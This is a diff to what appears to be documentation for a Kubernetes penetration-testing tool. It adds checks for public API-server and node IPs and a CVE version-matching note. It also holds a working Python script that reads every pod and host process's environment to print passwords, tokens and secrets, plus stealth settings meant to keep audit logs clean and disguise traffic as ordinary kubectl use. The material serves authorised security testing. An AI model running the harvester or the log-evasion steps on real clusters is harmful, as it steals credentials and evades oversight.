-#              CVE-2022-3294, CVE-2023-2727/2728, CVE-2024-21626, etc.
+# The tool performs REAL version comparison — no blanket firing
+# CVE-2018-1002105 only fires on K8s minor < 13 (fixed in 1.10.11/1.11.5/1.12.3)
+# CVE-2024-21626 checks containerd version: >= 1.7.0 bundles runc >= 1.1.12 (patched)
+# Kernel CVEs check actual kernel version range — kernel 6.12 correctly shows PASS
 ```
 
 ---
 
-### 15.2 Cluster-Wide Privileged Pod Audit
+### 15.2 API Server Public Exposure
+
+> 🔴 **CRITICAL** — Kubernetes API server accessible from the internet means anyone
+> can attempt brute-force authentication or exploit unpatched API server CVEs remotely.
+
+```bash
+# Resolve the API server IP and check if it is public or private
+API_IP=$(python3 -c "
+import socket, os
+host = os.environ.get('KUBERNETES_SERVICE_HOST','kubernetes.default.svc')
+try:    print(socket.gethostbyname(host))
+except: print(host)
+" 2>/dev/null)
+
+python3 -c "
+ip = '$API_IP'
+try:
+    parts = list(map(int, ip.split('.')))
+    private = (
+        parts[0] == 10 or
+        parts[0] == 127 or
+        (parts[0] == 172 and 16 <= parts[1] <= 31) or
+        (parts[0] == 192 and parts[1] == 168) or
+        (parts[0] == 169 and parts[1] == 254) or
+        (parts[0] == 100 and 64 <= parts[1] <= 127)
+    )
+    if private:
+        print(f'✅ API server on private IP: {ip}')
+    else:
+        print(f'🔴 API server on PUBLIC IP: {ip} — internet-exposed!')
+        print('   Fix: aws eks update-cluster-config --resources-vpc-config endpointPublicAccess=false')
+except Exception as e:
+    print(f'Could not determine: {e}')
+"
+```
+
+---
+
+### 15.3 Worker Node Public IP Check
+
+> 🟠 **HIGH** — public node IPs expose kubelet (10250), NodePort services, and
+> runtime sockets directly to the internet.
+
+```bash
+kubectl get nodes -o json 2>/dev/null | python3 -c "
+import sys, json
+d = json.load(sys.stdin)
+for node in d.get('items', []):
+    name = node['metadata']['name']
+    for addr in node.get('status',{}).get('addresses',[]):
+        ip = addr['address']
+        if '.' not in ip: continue
+        try:
+            parts = list(map(int, ip.split('.')))
+            private = (
+                parts[0] == 10 or
+                parts[0] == 127 or
+                (parts[0] == 172 and 16 <= parts[1] <= 31) or
+                (parts[0] == 192 and parts[1] == 168)
+            )
+            icon  = '✅' if private else '🔴'
+            label = 'private' if private else 'PUBLIC!'
+            print(f'{icon} {name}: {ip} ({addr["type"]}) — {label}')
+        except: pass
+"
+```
+
+---
+
+### 15.4 Cluster-Wide Privileged Pod Audit
 
 ```bash
 # Find all privileged/over-permissioned pods across every namespace
@@ -1459,23 +1709,57 @@ for s in d.get('items', []):
 ## 🔍 Phase 19: /proc Credential Harvesting ⭐
 
 ```bash
-# Scan all process environ files
+# Two-phase scan: pod co-processes first, then host processes via hostPID
+# Uses cgroup comparison to distinguish pod PIDs from host PIDs — prevents
+# the same credential appearing twice when hostPID is enabled
 python3 -c "
 import os
-cred_kw = ['password','secret','token','api_key','database_url']
-skip_kw = ['kubernetes','service_port','service_host','path','home']
+cred_kw = ['password','secret','token','api_key','redis','database_url']
+skip_kw = ['kubernetes','service_port','service_host','path','home','shell','term']
+
+# Get our cgroup to identify the pod boundary
+our_cgroup = open('/proc/self/cgroup').read().split('
+')[0].split(':')[-1]
+our_pid    = str(os.getpid())
+pod_pids   = {our_pid}
+
+print('=== Pod Co-Processes ===')
 for pid in os.listdir('/proc'):
-    if not pid.isdigit(): continue
+    if not pid.isdigit() or pid == our_pid: continue
     try:
-        env = open(f'/proc/{pid}/environ').read().split('\x00')
-        comm = open(f'/proc/{pid}/comm').read().strip()
-        for ev in env:
-            if '=' in ev:
-                k, _, v = ev.partition('=')
-                kl = k.lower()
-                if any(kw in kl for kw in cred_kw) and not any(sk in kl for sk in skip_kw) and v:
-                    print(f'🔴 PID {pid} ({comm}): {k}={v[:60]}')
+        pid_cg = open(f'/proc/{pid}/cgroup').read().split('
+')[0].split(':')[-1]
+        comm   = open(f'/proc/{pid}/comm').read().strip()
+        if pid_cg == our_cgroup:          # same cgroup = same pod
+            pod_pids.add(pid)
+            for ev in open(f'/proc/{pid}/environ').read().split(''):
+                if '=' in ev:
+                    k, _, v = ev.partition('=')
+                    kl = k.lower()
+                    if any(kw in kl for kw in cred_kw) and                        not any(sk in kl for sk in skip_kw) and v:
+                        print(f'🔴 PID {pid} ({comm}): {k}={v[:60]}')
     except: pass
+
+# Host processes — only if hostPID is enabled (PID 1 = systemd/init)
+pid1 = open('/proc/1/comm').read().strip()
+if pid1 in ('systemd','init'):
+    print('
+=== Host Processes (hostPID) ===')
+    host_kw = ['kube','etcd','containerd','docker']
+    for pid in os.listdir('/proc'):
+        if not pid.isdigit() or pid in pod_pids: continue  # skip pod's own PIDs
+        try:
+            comm    = open(f'/proc/{pid}/comm').read().strip()
+            cmdline = open(f'/proc/{pid}/cmdline').read().replace('',' ')
+            if any(kw in comm.lower() or kw in cmdline.lower() for kw in host_kw):
+                print(f'Host process: PID {pid} ({comm})')
+                for ev in open(f'/proc/{pid}/environ').read().split(''):
+                    if '=' in ev:
+                        k, _, v = ev.partition('=')
+                        kl = k.lower()
+                        if any(kw in kl for kw in cred_kw) and                            not any(sk in kl for sk in skip_kw) and v:
+                            print(f'  🔴 {k}={v[:60]}')
+        except: pass
 "
 ```
 
@@ -1610,6 +1894,16 @@ python3 kubexhunt.py --stealth 2 --no-mutate
 # - Read-only: all capabilities inferred from RBAC, no test resources created
 # - Batched: parallel checks minimized
 # - Result: zero mutating audit log entries, traffic looks like normal kubectl usage
+
+# Verify --no-mutate produces PASS (not HIGH) for the mutating API calls finding
+python3 kubexhunt.py --no-mutate --phase 24 --no-color 2>/dev/null | grep -A2 "Mutating API"
+# Expected: ✅ PASS  Mutating API calls skipped (--no-mutate active)
+#           Zero write operations in audit log
+
+# Verify stealth level is reflected correctly
+python3 kubexhunt.py --stealth 1 --phase 24 --no-color 2>/dev/null | grep -A2 "Stealth"
+# Expected: ✅ PASS  Stealth level 1 active
+#           kubectl User-Agent spoofing | Timing jitter (0.3–2s)
 ```
 
 ---
@@ -1710,6 +2004,9 @@ python3 kubexhunt.py \
 | Flat network (no NetworkPolicy) | 🟡 Medium | Unrestricted lateral movement |
 | PSS not enforced on namespace | 🟡 Medium | Container escape vector open |
 | cluster-wide automountServiceAccountToken | 🟡 Medium | Every pod a K8s API auth point |
+| API server on public IP | 🔴 Critical | Internet-exposed K8s API — brute-force / CVE exploitation risk |
+| Worker nodes with public IPs | 🟠 High | Kubelet 10250 / NodePort services exposed to internet |
+| Registry credential catalog pivot | 🟠 High | Pull/push private images — supply chain backdoor possible |
 | Missing resource limits | 🔵 Low | Node DoS / noisy neighbour |
 | No audit logging | 🔵 Low | No forensic trail for incidents |
 
